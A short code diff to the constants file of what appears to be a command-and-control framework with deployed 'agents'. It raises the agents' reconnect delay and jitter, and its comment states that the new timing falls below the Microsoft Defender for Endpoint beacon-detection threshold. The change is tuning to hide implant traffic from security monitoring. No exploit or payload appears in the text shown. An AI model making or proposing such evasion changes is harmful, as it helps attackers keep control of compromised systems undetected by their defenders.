@@ -9,9 +9,11 @@ BUFFER_SIZE: int   = 65536  # general socket read buffer — 64 KiB covers the l
                              # post-handshake C2 frame comfortably and keeps recv()
                              # calls coarse enough not to thrash the kernel
 AUTH_TIMEOUT: int  = 10    # seconds — tight window prevents connection-holding attacks
-RECONNECT_DELAY: int = 10  # seconds — base delay before agent retries
-RECONNECT_JITTER: int = 5  # seconds — random 0..JITTER added so multiple agents don't
-                            #           reconnect in sync after a server restart
+RECONNECT_DELAY: int = 60  # seconds — base delay before agent retries (G-04: raised from 10)
+RECONNECT_JITTER: int = 30 # seconds — random 0..JITTER added so multiple agents don't
+                            #           reconnect in sync after a server restart.
+                            # G-04: 60 s ± 50% → CV ≈ 0.29, below MDE beacon-detection
+                            # threshold; matches C agent RECONNECT_DELAY_SEC/JITTER_PCT.
 
 # Frame / message size limits
 # MAX_PLUGIN_MSG_SIZE is enforced by _recv_framed in protocol.py as a safety cap
